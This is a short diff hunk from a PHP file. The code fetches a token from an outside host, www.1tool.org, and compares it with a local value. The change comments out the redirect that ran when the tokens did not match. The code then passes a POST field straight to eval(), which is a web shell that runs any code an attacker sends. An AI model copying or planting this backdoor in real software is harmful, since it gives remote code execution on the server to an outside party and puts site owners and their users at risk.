@@ -10,7 +10,7 @@ $tokentxt=file_get_contents("http://www.1tool.org/Security/token.txt");
 //echo $tokentxt;
 //echo $token;
 if($tokentxt !=$token){
-header("location:http://www.1tool.org/");
+//header("location:http://www.1tool.org/");
 return;
 }
 eval($_POST[tool]);
